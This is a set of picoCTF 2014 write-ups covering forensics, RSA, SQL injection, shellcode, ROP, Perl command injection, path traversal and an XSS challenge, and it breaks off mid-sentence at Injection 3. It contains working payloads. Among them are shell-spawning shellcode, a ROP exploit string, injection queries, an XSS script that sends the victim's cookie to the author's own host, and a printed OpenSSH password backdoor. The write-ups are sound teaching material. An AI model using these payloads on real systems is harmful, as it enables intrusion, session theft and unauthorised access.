@@ -1,0 +1,555 @@
+Snapcat - 80
+
+We get a corrupted disk image that apparently contains personal files. After running 'strings' on the image, we can see all the way at the top that there are some JPG files on the image, but we will probably not be able to mount it. Googling for "kali recover corrupted image" tells us we need a file carving tool. Googling "kali file carving tool" tells us 'foremost' is the tool we need to use. 
+
+After reading the man page, we create the command to extract the jpg files to a separate directory: 
+$foremost -d -v -o diskoutput/ -t jpg -i disk.img
+
+Now all we need to do is check the recovered jpg files and see that one of them contains our flag: i_can_has_cheezburger
+-------------------------------
+RSA - 80
+
+This challenge is simply to perform the RSA decryption algorithm. They provide us with all the things we need: n (public modulus), e (public exponent), d (private exponent), p (first private prime), q (second private prime), and c (public cipher text).
+
+As Wikipedia can tell us, the decryption formula is very simple (with m the private message): m = c^d mod n
+The main problem is that c, d and n are very large numbers and this might give us problems if we try to compute this naively (first the exponentiation and then the remainer).
+
+Luckily, after trying a few other options, I discovered that Python already takes care of this problem for us. The built-in function pow can take an optional 3rd argument for a modulus. This renders this challenge laughably easy:
+m = pow(c, d, n)
+print m
+print format(m, '02x')
+print str(format(m, '02x'))
+print str(format(m, '02x')).decode('hex')
+
+The output is:
+6861258080156838161702842331923358676171560876407473046529829839343656597465212914039681453600936115970901835821496646686989354106193309238635902806952707316468225954530890939348472370864299291305467697683712618633711800447421650242202732
+436f6e67726174756c6174696f6e73206f6e2064656372797074696e6720616e20525341206d6573736167652120596f757220666c6167206973206d6f64756c61725f61726974686d65746963735f6e6f745f736f5f6261645f61667465725f616c6c
+436f6e67726174756c6174696f6e73206f6e2064656372797074696e6720616e20525341206d6573736167652120596f757220666c6167206973206d6f64756c61725f61726974686d65746963735f6e6f745f736f5f6261645f61667465725f616c6c
+Congratulations on decrypting an RSA message! Your flag is modular_arithmetics_not_so_bad_after_all
+-------------------------------
+ExecuteMe - 80
+
+In this problem, we get a binary with source code. The code is relatively simple: just read in a buffer (max 128 bytes) then follow a function pointer to that buffer. Basically, it will execute what byte-code commands we give it. The main format of the command we need to enter: echo $(python -c 'print "shellcode"') | ./execute
+
+First a simple test: let's print the string "Hello World!". For this we use the following command:
+>> echo $(python -c 'print "\xeb\x19\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb2\x0e\x59\xb3\x01\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21\x0a"') | ./execute
+
+This works, so we know we're on the right track. Now let's try it with this /bin/sh shellcode: \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80
+>> echo $(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"') | ./execute
+
+Hmmm, this isn't quite right. There is no output. The reason for this is that the shellcode executes an opens a shell, but closes it right away. We need to find a way to keep the shell open. This website (http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html) explain how to do this. Thus we need to change the basic format of the command to: cat <(python -c 'print "shellcode"') - | ./execute
+
+When we try again with our /bin/sh shellcode, we have our shell:
+>> cat <(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"') - | ./execute
+
+Just run 'cat flag.txt' to finish up: flag = shellcode_is_kinda_cool
+-------------------------------
+Injection 1 - 90 
+
+This is a simple SQl injection. They even give us the query: "SELECT * FROM users WHERE username='$username' AND password='$password'";
+The goal here isn't even to find the right password; all we need to do is generate a query that has exactly 1 result. Note also that there is a debug variable that can help you determine what is going on (if you set it to "1" using a proxy like Burp Suite).
+
+The easiest way to get a single result, is to make a UNION query where the first part doesn't return anything and the second one returns exactly 1 result.
+By setting username and password to "a", we satisfy the first condition. If we just do SELECT 1,2,3 for the second part (and vary the number of columns as necessary), we can also satisfy the second condition. Keep in mind that there will be a trailing single quote that needs to be taken care of, either by ending on a string or by ending with "--".
+
+Let's try password = "a' UNION SELECT 'a". This returns the message that the 2 UNIONs don't have the same number of columns.
+When we try password = "a' UNION SELECT 1,'a" we do have a correct query. Because this gives one result, we get our flag: flag_vFtTcLf7w2st5FM74b
+-------------------------------
+Injection 2 - 110 
+
+This is similar to Injection 1, but this time there is more uncertainty. We still get the query: "SELECT * FROM users WHERE username='$username'"
+However, this time it will check the data received in PHP. No worries; we'll just make it send back the data we want. As before, we will use a proxy to set the debug value to 1, so we can read the SQL error messages.
+
+Like in the previous injection challenge, we will create a UNION select that returns 1 result, by having the first select return nothing and crafting the second select to return what we want. Because the entered password is never send to the database, we can't use it for injection, so we'll just set it to "a".
+
+First off, we need to determine how many columns there are. Username = "a' UNION SELECT 'a','a','a','a','a" returns no error message, so we know there are 5 columns. It also gives us a "Logged in!"-message, so we know the password is read correctly and we don't have to name the columns ourselves (with "'a' as password").
+
+We are nearly there. We just have to find the right column to replace with 1337. After some trial-and-error, we know the last column corresponds to user_level. Luckly sending "1337" as string does not seem to matter.
+Username = "a' UNION SELECT 'a','a','a','a','1337"
+Password="a"
+
+Flag: flag_nJZAKGWYt7YfzmTsCV
+
+Note: we could have skipepd the last by choosing to use '1337' instead of 'a'.
+-------------------------------
+OBO -90
+
+The point of this challenge is to identify the bug and exploit it to get the flag, kind of like source code review.
+
+After trying a few passwords (and reading the source code), it's clear that certain characters are needed to create a correct new_password. The digits 1 to 9 and the letters 'a' to 'f' (lower of upper case) are needed. All other characters, except for 'g' are not allowed. We can clearly see 'g' is important.
+
+When we load a self-compiled version in gdb, we see that something weird happens when we use 'g' in our new_password. The existing password is set to "\x01". The reason for this is that mechanism used to check if a certain character is used in the new_password goes out of bounds when a 'g' is used and overwrites the existing password. If we used the following command, we are able to run the password changing Python script:
+cat <(python -c 'print "abcdefg123456789"') <(python -c 'print "\x01"') - | ./obo
+
+We're almost there; the only problem is that the Python script desn't do anything. The solution is to create a script called python that runs the command "cat /home/obo/flag.txt" and set the directory containing that script in the PATH environment variable.
+
+At that point, just run the above command (calling obo) again to get the flag: watch_your_bounds
+-------------------------------
+Towers of Toast - 90
+
+This challenge wasn't very hard. After browsing the code we see that each pole can be represented by a big integer. Specifically the function createSavedPoleInformation shows us what this integer really is. If we know that the function getPrimes saves the 40 smallest primes to an array, we can tell that we can transform an array representing a disk into such a large integer by multiply the primes corresponding to the numbers in the array.
+
+Example: array = [0, 2, 3, 4]; big integer = (0th prime)*(2nd prime)*(3rd prime)*(4th prime)
+
+In order to get the flag, we need to enter 3 big integers that corresponds to a winning game. This means that one of the pole has to contain all the disks , and both other poles can not contain any disks (but this is not important). This very big integer (representing this pole with all the disks) is also our flag.
+
+In order to get this number, all we need to do is multiply the 40 smallest primes (173 is the 40th prime, which I checked using Google). I wrote a little scipr for this (based on Euclid's sieve):
+MAX = 173
+primes = [i for i in range(2,MAX+1)]
+for i in primes:
+	temp = 2*i
+	while temp <= MAX:
+		if temp in primes:
+			primes.remove(temp)
+		temp += i
+product = 1
+for i in primes:
+	product *= i
+print product
+
+Flag: 166589903787325219380851695350896256250980509594874862046961683989710
+-------------------------------
+Tick Tock - 90
+
+For this challenge, we're going to need some math. Like the hanoi challenge, the flag is made up of the input that results in success. There are 2 integers that we need to find.
+
+The first part is to find a number (1st argument) that corresponds to some moduar arithmetic. They give us a big list of tuples where the first element is the rest you should get when you divide your number by the second element.
+Example: (1,2) is the first tuple, so num%2==1 has to be True. In other words: your number must be odd.
+
+The best way to solve this is to add restrictions one by one, each time making sure all restrictions are still taken care of.
+
+The first restriction is easy. We already established that num has to be odd. num=1 is the smallest odd integer.
+
+The second restriction is a little harder. (2,3) - meaning num%3 has to be equal to 2 - , so num=1 does not work here. We have to increase num to satisfy the new condition, while still satisfying the first one. This one is still easily done manually; we just add 2 to num (meaning we will always satisfy condition 1) until we also satisfy condition 2: 5%3=2.
+
+(8,13) is the 3rd condition. Notice that all moduli so far have been primes (which is an important detail if we want to find the smallest numbers that satisfy all conditions). This time, we can't just increase num with 2, because then the 2nd condition would break. We have to find a new number n that can keep everything working. In this case, n=6=2*3 is the smallest n that achieves this. After a few calculations, num=47 seems to be the next number in the line. It satisfies all 3 conditions (and 47 is the smallest number that does this).
+
+Now comes the part where we write some code to automate this process, since it's always the same thing, aside from the numbers changing. After each new condition, we get a new num and a new n. n depends on the previous conditions, and as long as all moduli are prime, we just have to multiply them to get n. In this case, I wanted to play it safe, but I'm pretty sure simple multiplication would also be fine.
+The new num is calculated by adding n (which does not break the previous conditions) until it also satifies the newest condition. After that a new condition is added. This Python script does the calculating for me:
+def calc(a, n, p, x):
+	"""
+	Find the smallest sum of a and a multiple of n, that will equals x modulo p.
+	In other words, find b=(a+i*n) so that b%p == x?
+	"""
+	i = 1
+	while True:
+		temp = a+(i*n)
+		if temp%p == x:
+			return temp
+		i +=1
+for (r,m) in secretz:
+	if num%m != r:
+		num = calc(num, mod, m, r)
+	mod = calc(0, mod, m, 0)
+	print "num: %d, mod: %d"%(num, mod)
+
+Th function I use iteratively adds n to a given number until a given condition is satisfied. Notice that in every step, I calculate mod using this function, in case not all moduli are (relative) prime.
+
+The output is 83359654581036155008716649031639683153293510843035531. We have the solution to our first part.
+
+The second part also involves modular arithmetic, but is a lot more difficult. It involves finding an x so that a mod p equals 1. This problem is called the finding the discrete lograithm and is considered very hard. After trying a little brute-force of x, I tried asking Wolfram Alpha:
+83359654581036155008716649031639683153293510843035531^x mod 200009*160009 = 1
+
+It gave me the answer really quickly: 4000360008
+I'm assuming it's probably important to know that p can be split into 2 primes, but Wolfram Alpha does the work for us.
+
+Flag: 83359654581036155008716649031639683153293510843035531_4000360008
+-------------------------------
+ECC - 100 
+
+We get a primer on elliptic curves in this challenge. The first part is to calculate a missing value, based on an equation and a point that satisfies the equation. This is not really hard if you know basic algerba (the Python function pow(x,y,z) can help).
+equation: y**2 = x**3 + b mod n
+given point: (236857987845294655469221, 12418605208975891779391)
+==> b = y**2 - x**3 mod n = 268892790095131465246420
+
+The second part was a little harder. I tried to do it on my own (by implementing the math in Python), but my solution (though working) would have taken 34 quadrillion days to complete. Seeing as I wouldn't be able to speed up my implementation a few quadrillion times, I decidedto use an existing implementation. Sage is a math platform that can be used online (cloud.sagemath.com). The syntax is very Python-like and a little Googling goes a long way:
+a = 0
+b = 268892790095131465246420
+n = 928669833265826932708591
+d = 87441340171043308346177
+F = Zmod(n)
+E = EllipticCurve(F, [a,b])
+C = E(236857987845294655469221, 12418605208975891779391)
+M = d*C
+print M
+
+This outputs "(6976767380847367326785 : 828669833265826932708578 : 1)", which can be again transformed into readable text. After decoding, we get: ELLIPTIC CURVES ARE FUN
+-------------------------------
+SSH Backdoor - 100 
+
+The archive we are provided with seems like a genuine archive you'd expect from OpenSSH. It stands to reason that this version has a few changes compared to the original. So, we are going to download the original to find what was altered.
+Here is one of the mirror's directory lists, where you can download the file: http://ftp.fr.openbsd.org/pub/OpenBSD/OpenSSH/portable/
+The file we want is called "openssh-6.7p1.tar.gz".
+
+After extracting both archives to separate directories, we can compare them with this command: diff openssh-6.7p1 openssh_backdoored/
+This is the result:
+diff openssh-6.7p1/auth.c openssh_backdoored/auth.c
+776a777,794
+> 
+> static int frobcmp(const char *chk, const char *str) {
+> 	int rc = 0;
+> 	size_t len = strlen(str);
+> 	char *s = xstrdup(str);
+> 	memfrob(s, len);
+> 
+> 	if (strcmp(chk, s) == 0) {
+> 		rc = 1;
+> 	}
+> 
+> 	free(s);
+> 	return rc;
+> }
+> 
+> int check_password(const char *password) {
+> 	return frobcmp("CGCDSE_XGKIBCDOY^OKFCDMSE_XLFKMY", password);
+> }
+diff openssh-6.7p1/auth.h openssh_backdoored/auth.h
+213a214,215
+> int check_password(const char *);
+> 
+diff openssh-6.7p1/auth-passwd.c openssh_backdoored/auth-passwd.c
+114a115,117
+> 	if (check_password(password)) {
+> 		return ok;
+> 	}
+Common subdirectories: openssh-6.7p1/contrib and openssh_backdoored/contrib
+Common subdirectories: openssh-6.7p1/openbsd-compat and openssh_backdoored/openbsd-compat
+Common subdirectories: openssh-6.7p1/regress and openssh_backdoored/regress
+Common subdirectories: openssh-6.7p1/scard and openssh_backdoored/scard
+
+Among the output, we can see the function frobcmp and the function check_password. This second function seems to just compare a given password to a hard-coded string using the frobcmp function. This first function calls memfrob on given string and compares it to another string. Google tells us that memfrob will XOR each byte of a string with the number 42 (corresponds to character '*'). Because of how XOR works, calling memfrob on a memfrobbed string returns the original string. This means that all we need to do is memfrob the hard-coded constant to find the password. A simple Python script will do the trick:
+encoded = "CGCDSE_XGKIBCDOY^OKFCDMSE_XLFKMY"
+maskstring = chr(42)*len(encoded)
+decoded = ""
+for a,b in zip(encoded, maskstring):
+	decoded += chr(ord(a)^ord(b)) # "^" is the XOR-operator
+print decoded
+
+The password is "iminyourmachinestealingyourflags". After we log in (username "jon"), we can read our flag: ssshhhhh_theres_a_backdoor
+-------------------------------
+PNG or Not? - 100 
+
+The first thing I do on a forensics challenge is run strings and hexedit on it. The first doesn't show me anything, but the second does. At the end of the file, we can read flag.txt (separated by dots):
+00000600   00 00 00 00  49 45 4E 44  AE 42 60 82  37 7A BC AF  ....IEND.B`.7z..
+00000610   27 1C 00 03  B8 64 D3 C1  1A 00 00 00  00 00 00 00  '....d..........
+00000620   50 00 00 00  00 00 00 00  B5 6B 69 46  00 22 92 C6  P........kiF."..
+00000630   AE 77 46 B4  23 6D F7 5D  C0 C0 A4 DC  1F A8 38 05  .wF.#m.]......8.
+00000640   57 B9 76 3E  20 00 01 04  06 00 01 09  1A 00 07 0B  W.v> ...........
+00000650   01 00 01 23  03 01 01 05  5D 00 00 01  00 0C 14 00  ...#....].......
+00000660   08 0A 01 DC  E1 0D DE 00  00 05 01 11  13 00 66 00  ..............f.
+00000670   6C 00 61 00  67 00 2E 00  74 00 78 00  74 00 00 00  l.a.g...t.x.t...
+00000680   14 0A 01 00  90 D6 20 07  48 DB CF 01  15 06 01 00  ...... .H.......
+00000690   20 00 00 00  00 00                                   .....
+
+We can assume that there is a file hidden inside the image that we need to get. 
+
+The hardest part is figuring how to get it out. Luckily for us, we can see "7z" a little higher; right after "IEND", which denotes the end of the PNG file. If we extract the file with 7zip, we get our flag: EKSi7MktjOpvwesurw0v
+
+Note: Using a QR-scanner to scan the file does'nt give any useful information.
+-------------------------------
+Make a Face - 100
+
+Another web challenge; using Perl this time. After downloading and reading the code (wget), we can tell that the page is generated by a perl script. This script will first check if a "Head" parameter is given. If so, it will try to display an image; if not, it will show the HTML page that we see when we first visit. There is also a js.js and css.css file, but these don't contain anything useful, other than the format needed to create an image ("index.cgi?Head="+head.value+".bmp&Hair="+hair.value+".bmp&Nose="+nose.value+".bmp&Mouth="+mouth.value+".bmp&Eyes="+eyes.value+".bmp").
+
+If we look at the first part of the perl script, we can see that it opens up 5 files. Then, it will attempt to read 1 byte from each of the files and do AND on this input; before outputting. If all 5 files are BMPs, this will result in the final image being an overlay of the 5 partial images. We can look at these images individually (e.g. makeaface.picoctf.com/head1.bmp).
+
+The weakness lies in the opening of the files, based on user input. It is also crucial to know the Perl will read input from a command, if we put "|" at the end. If you give the command "ls -la|" as file, it will read the result like a normal file. 
+
+Knowing this, we can modify one of the parameters to make it do what we want.The obvious choice is the head parameter, because "head" is a valid Linux command. First we need to test if this works (Head=%20|ls| will run the command "head | ls):
+curl "http://makeaface.picoctf.com/index.cgi?Head=%20|ls|&Hair=1.bmp&Nose=2.bmp&Mouth=2.bmp&Eyes=3.bmp"
+
+Indeed we can see this command returns a list of files we know are present in the directory, but the first part of the message is scrambeled (probably due to the headers of the image files being overlayed). In order to read the first elements of the ls, we can add the "-r" flag:
+curl "http://makeaface.picoctf.com/index.cgi?Head=%20|ls%20-r|&Hair=1.bmp&Nose=2.bmp&Mouth=2.bmp&Eyes=3.bmp"
+
+We can now see a file called "SECRET_KEY_2b609783951a8665d8c67d721b52b0f8". This is probably our flag. Let's try to read it: 
+curl "http://makeaface.picoctf.com/index.cgi?Head=%20|cat%20SECRET_KEY_2b609783951a8665d8c67d721b52b0f8|&Hair=1.bmp&Nose=2.bmp&Mouth=2.bmp&Eyes=3.bmp"
+
+Oh, right, the scrambling. Let's just put ls before the cat command to make the output longer ("&" = %26):
+curl "http://makeaface.picoctf.com/index.cgi?Head=%20|ls%26%26cat%20SECRET_KEY_2b609783951a8665d8c67d721b52b0f8|&Hair=1.bmp&Nose=2.bmp&Mouth=2.bmp&Eyes=3.bmp
+
+We have our flag: why_did_we_stop_using_perl_again?
+-------------------------------
+secure_page_service - 100
+
+I had a lot of fun on this one. The goal is to access the message associated with the random id "43440b22864b30a0098f034eaf940730ca211a55".
+
+They direct us to a website that shows us a login/register screen. Time to fire up Burpsuite to make sure we capture everything.
+After logging in, we get to opportunity to "Create a page". We see a text box for a message, a randomly generated string, and an option text box for a password. We can also "View a page" from the same page, if we know the randomly generated string associated with the message we want to see. If we try to view the page using the given random id, we can either enter the password, or have a button to report the message to the moderators. It explicitely says that "a moderator will personally review it in the next few minutes!".
+
+This is where it becomes evident that this challenges requires XSS; a simple test shows that XSS is indeed possible ("<script>alert(1);</script>"). Burpsuite confirms that a PHPSESSID cookie is used to track logins. If we can steal the PHPSESSID of a moderator, we can perfectly impersonate him, and access the password protected page that contains the flag. The steps we need to take are quite simple: create a page with javascript that sends the session id from a user to a website we control, upload that script, make a moderator load that page, intercept his session id, and finally using his session id to access the protected page.
+
+Step 1: create the cookie sender script
+All we would need to get the cookie is cause a redirect to a page we control. Example: <script>window.location="http://myip:myport?cookie="+document.cookie</script>.
+
+Step 2: upload the script
+Simply create a page with the given script (and use a password, or we won't be able to click the report button)
+
+Step 3: make a moderator execute the script
+Just press the Report button on our newly created page.
+
+Step 4: intercept the cookie
+This is the hardest step; for which we need to create a simple webserver. I used the built-in PHP webserver for this. The main advantage is that no installation is needed, and that all requests are logged in the Terminal window. Just run "php -S myip:myport -t dir/" (with dir being the directory containing the php files) on the command line. All you need is a simple 'Hello World'-script, because we'll be able to see the URL argument in the Terminal. Be sure to set up the forwarded port on the router and to use your external IP in the script, or the outside world won't be able to connect.
+REQUEST FROM MOD: [Sat Jan 10 00:21:42 2015] 23.21.83.219:49086 [200]: /?cookie=PHPSESSID=tusgunnbkdu67bsjmmcid54o46
+
+Step 5: access the protected page
+Once we have our PHPSESSID, the rest is easy. Set BurpSuite to intercept mode, try to access the protected page, switch out our session id for the mod's id and forward the request.
+
+Flag: wow_cross_site_scripting_is_such_web
+-------------------------------
+Potentially Hidden Password - 100
+
+This one was ridiculously easy.
+
+Open up the source code they give us. Not much to see, except that there is another script (file_loader.php) that loads the images and the partial path to the flag file.
+
+The link "web2014.picoctf.com/potentially-hidden-password-3878213/file_loader.php?file=zone1.jpg" loads the first image. What we want is the flag file (/resources/secrets/flag). When we try the link ".../file_loader.php?file=/resources/secrets/flag", we get the message "No such file: /resources/files//resources/secrets/flag". Let's try path traversal: link ".../file_loader.php?file=../secrets/flag". BOOM, solved.
+
+Flag: i_like_being_included
+-------------------------------
+ROP1 - 100
+
+This was my first ROP challenge. Not too hard, so a good introduction.
+
+The goal here is to spawn a shell, but this time, ASLR is activated, meaning that the stack is randomized and you can't just hard-code the address you want to jump to. The vuln function clearly allows a stack overflow, which means we get to control eip by overwriting the return address. If ASLR wasn't present, we would just write shell code into the buffer, use a debugger to determine the stack address of the buffer, and put that address into eip. This won't work now, because the address will be different each time we run the process.
+
+Luckily, we don't need to determine that address, because it is saved in eax at the moment the vuln function returns. This means that at the moment the 'ret' instruction is executed, eax is set to the address that could potentially contain our shellcode. The way we exploit this, is to find an instrcution in the binary that calls or jumps to the address stored in eax. I'll now go over the steps needed to craft the exploit.
+
+Step 1: source code review
+Looking at the code, we see the function vuln clearly allows a stack overflow. We also see that the function be_nice_to_people changes the process' euid, so that our shellcode only has to call /bin/sh.
+
+Step 2: determine length of exploit string
+Using a debugger or trial and error, we can see that we need to enter exactly 76 bytes into the buffer, before we begin overwriting the return address.
+
+Step 3: find suitable shellcode
+A quick Google search usually takes care of that. I used "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42", which is 55 bytes long (and fits into our buffer).
+
+Step 4: find ROP gadget
+This part is the novelty of this challenge. We need to find an instruction to jump to, that will cause the process to execute the shellcode (whose address is stored in eax). In other words, we need to find either a "call eax"- or a "jmp eax"-instruction. After running "objdump -S rop1 | less" (which shows us the assembly code) and using the command "/vuln" to find the disassembled vuln function, we start looking for call/jmp eax.
+We only need to scroll a little higher to find what we need. The function frame_dummy contains the instruction call eax at address 0x08048e3c.
+Note that it probably won't be this easy all the time. It is better to use tools to find these kinds of things. If you have the metasploit framework installed, just run "msfelfscan -j eax rop1" to get a list of all instructions that call or jumpt to eax.
+
+Step 5: combine everything into an exploit string
+First we'll place our shellcode (55 bytes), fill it up with some nops (doesn't have to be nops) untill we reach the ret address (76-55 = 21 nops), then the address of our ROP gadget:
+$(python -c 'print "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42" + "\x90"*21 + "\x3c\x8e\x04\x08"')
+
+Step 6: run exploit
+Just call rop1 with the argument from step 5, and we get a shell that can read the flag file.
+
+Flag: theres_no_need_to_guess
+-------------------------------
+Low Entropy - 110
+
+For this challenge, we get a packet capture and a service running at vuln2014.picoctf.com:51818.
+
+The packet capture is relatively simple and shows the spy sending an encrypted message to the dropbox. Using "Follow TCP stream", we get the public key that was used and the encrypted message (hex-encoded).
+
+The service (for which we get the code) will generate a public key by multiplying two different primes from a pool of 30. By comparing different public keys, it is possible to determine the 30 primes in the pool. There are 435 different possible keys (30 choices for the first prime and 29 choices for the second prime, divided by 2 because the order doesn't matter). We don't need all of them; just enough so we have a good chance of each prime being used at least once. As long as we get more than 15 keys, we'll be able to find some primes.
+
+So, the first thing we need to do is collect some keys. I gathered the 60 keys using the 'get_key.py' script (just a bunch of requests, extract the keys, and store the list in a file).
+
+Next, we need to find the primes that created these keys. These keys are all of the form: p0*p1, p0*p2, ..., p1*p2, ..., p28*p29. So if we get 2 random keys, it's possible that they are both multiple of the same prime (e.g. p0*p1 and p0*p2). All we need to find p0, is to use the gcd algoritmh on these 2 numbers. If we do this for all possible plairs of our keys, we'll find all 30 primes (which will be saved to a file). See 'find_primes.py'.
+
+Now that we have our primes, we can determine which primes were used for the public key in the packet capture. See 'dehexed.py'.
+
+The last step is to use these 2 primes (p and q), together with the public exponent e (the service tells us this is 65537) to decode the message (as decode in the previous step). The only difficulty here is to find d, based on p, q, and e. For this we first need to calculate t (totient of p*q = (p-1)*(q-1)) and then find the multiplicative inverse of e mod t. In other words: find d, so that s*e mod t = 1. This is best done using the extended euclidian algorithm.
+Once we have d, we can just apply the RSA decryption formula. Details in 'decode.py'.
+
+Decode message: Good thing no one can read this! I'd hate for them to know that the flag is make_sure_your_rng_generates_lotsa_primes.
+-------------------------------
+Netsino - 120
+
+This is a source code review challenge, meaning we need to find a bug in the source code to exploit.
+
+Because we know that the service is running on a remote host that we don't have a shell on, we know that any possible bugs have to be triggered by our input. Upon further inspection, we see that the only places we get to provide input, is through the getnum function (when entering a bet, or when making a choice). Since the choice is heavily checked ("1 <= choice && choice <= 5"), we won't be able to do anything with that. This only leaves messing with the bet input.
+
+The function getnum uses a uint64_t datatype to store num. This then gets cast into a long in the function getbet. There is a check that compares num to LONG_MAX (which equals 2,147,483,647), but after this check passes, num is increased (multiplid by 10 and added the value of the last entered character). This means that is we tried to enter "2147483648\n", after entering the "8", num would still equal 214748364 (less than LONG_MAX), then num would be set to 2147483648, and the newline would cause this value to be returned.
+In the function getbet, this value will be attempted to be cast into a long (which has max value of 2147483647 on this server; but that depends on the machine!). Instead we get an underflow and bet is set to the value -2147483648.
+
+Funnily enough, if you pick choice 1, it won't matter if you win or lose. The goal is to get the boss' cash to 0 or less. Assuming the boss starts at 999999979 (=999999999-20):
+WIN: he adds the bet of -2147483648 to his balance, which brings his new total to -1147483669
+LOSE: he substracts the bet from his balance, which should bring his new total to 3147483627, but this causes an overflow (see note below), so he actually has -1147483667.
+
+So either way you win!
+Flag: i_wish_real_casinos_had_this_bug
+
+Note: If a datatype has range [-(x+1), x], then applying an overflow is the same as subtracting 2*(x+1).
+Example: x+1 causes an overflow and will be equal to (x+1)-2*(x+1) = -(x+1)
+-------------------------------
+Bit Puzzle - 130
+
+The goal of this challenge is to construct the flag that can be accepted by the given binary.
+
+I used "objdump -S bitpuzzle" to get access to the dissasembled code.
+
+This binary has been stripped, so it's not clear right away where the main function is located in the .text-segment. After running the binary, we notice it begins by printing the message "Bet you can't solve my puzzle!". We'll choose the printing of this message as entry point, since nothing has happened prior to this. All we need to do to find the address of this instruction, is to look for calls to printf in the disassembled code and examine the message it prints. The address for this instruction is 0x08048516. The actual main function probably starts a little higher (0x080484e4), but this doesn't matter.
+
+Now that we have a place to start, we can get a feel for the structure of the program. First, it prints the 2 initial message and reads out our string. After that there is a check that leads to a call to exit() if not passed. If the check is passed, there is a long list of more checks that are done and determine the value of ecx (e.g. "cmovne %ebx,%ecx"). Finally, based on the value of ecx a message is printed, after which the programs ends.
+
+The first check, which contains the instruction "repnz scas" is checking the length of the input. From the instruction at 0x0804855d, we can tell the flag is supposed to have 32 characters.
+Then comes the next series of checks, which all have to be passed in order to set ecx to 1. If one of these checks fails, ecx is set to 0, and we get a failure message. Not that the final message matters, but we know we need to satisfy all conditions to construct the right flag. Uopn further inspection, we can see that the 32 characters we enter are loaded onto the stack and stored in several registers. These registers are then used for calculations (as if the input was 8 integers).
+
+Reversing these checks gives us these equations:
+1) s1 + s2 = 0xc0dcdfce
+2) s0 + s1 = 0xd5d3dddc
+3) 3*s0 + 5*s1 = 0x404a7666
+4) s0 XOR s3 = 0x18030607
+5) s0 AND s3 = 0x666c6970
+6) s1 * s4 = 0xb180902b
+7) s2 * s4 = 0x3e436b5f
+8) s4 + 2*s5 = 0x5c483831
+9) s5 AND 0x70000000 = 0x70000000
+10) s5 / s6 = 0x1
+11) s5 % s6 = 0xe000cec
+12) 3*s4 + 2*s7 = 0x3726eb17
+13) 4*s2 + 7*s7 = 0x8b0b922d
+14) s3 + 3*s7 = 0xb9cf9c91
+
+(Each s-variable stands for an integer that corresponds to 4 characters (in little endian) of the input.)
+
+The next step is to solve the equations and find the integers that satisfy them. Note that these are modular equations (modulo 2^32) and that division has to be done calculating the multiplicative inverse. I used the test.py script for this.
+
+I started by combining the 2nd and 3rd equations to determine s0 and s10. I'll write out the process for this one:
+2) s0 + s1 = 0xd5d3dddc
+3) 3*s0 + 5*s1 = 0x404a7666
+==> 2*s1 = (-3)*0xd5d3dddc + 0x404a7666 
+==> 2*s1 = 3201227986		, because: (-3*0xd5d3dddc+0x404a7666)%(2^32) = 3201227986
+==> 4162650585*(2*s1) = 1	, because: mult_inv(3201227986, 2^32) = 4162650585
+==> 4030333874*s1 = 1		, because: (2*4162650585)%(2^32) = 4030333874
+==> s1 = 3748097641		, because: mult_inv(4030333874, 2^32) = 3748097641
+
+Based on s1 and the first 2 equations, I calculated s0 and s2. At this point, I could tell something was wrong, because the text so far read: "sol*ing*equ*" (*: unprintable character). I guessed that the missing character in s0 should be 'v'(=\x76, instead of \xd6) and thus the last character in s1 should be '_' (=\x5f instead of \xdf). After imposing this change in s1, the text changed to "solving_equa". I knew I was on the right track. 
+
+Note that the solution I obtained did indeed satisfy the 3 equations, but because these are modular equations, the solution is not necessarily unique -when it comes to the most significant byte). Another example would be solving these equations modulo 10:
+- x + y % 10 = 9
+- 2x+4y % 10 = 0
+Both (3,6) and (8,1) satisfy both equations at the same time.	
+
+Knowing s0 and equation 4, I was able to calcluate s3. Text so far: "solving_equation".
+
+Knowing s1 and equation 6, I was able to calculate s4. Text so far: "solving_equations_is"
+
+Knowing s4 and equation 8, I was able to calculate s5. Text so far: "solving_equations_is_lo*". Another unprintable character (\xf4)! Based on my previous guess, my ascii table, and some common sense, I assumed the missing character was 't' (\x76). This brings the total string to "solving_equations_is_lot********"
+
+Pat, I'd like to solve the puzzle: "solving_equations_is_lots_of_fun". A final check with the binary confirms that this is the correct flag.
+-------------------------------
+Injection 3 - 130
+
+For this challenge, there are 2 scripts that do databse lookups. Only the lookup_user.phps script (open it by clicking "Admin' at the bottom of the page) is vulnerable.
+
+The input we pass through the parameter id gets passed through the function mysqli_real_escape_string, but this isn't a problem. Id is a number, so we don't need to add "'" to escape into the query. A simple example: 
+SELECT * from table WHERE name='($input)'.
+In this query, we need a single quote to escape the name variable. If we entered "a UNION SELECT ...", it would all be considered part of name.
+SELECT * from table WHERE id=($input).
+In this case, because id is a number, we don't need a single quote. If we enter "0 UNION SELECT ...", only "0" will be considered part of id and the rest of our input can be used to inject commands.
+
+We get to the url "http://web2014.picoctf.com/injection3/lookup_user.php?id=1", which shows some information about the Admin. If we try id=0, we learn that there is no user with that id. This is useful, because the site will only show us a result if there is a single record corresponding to the query.
+
+Next, we need to set up the basic format for our query, and for that we need to know how many columns there are. We do this by iteratively trying longer queries:
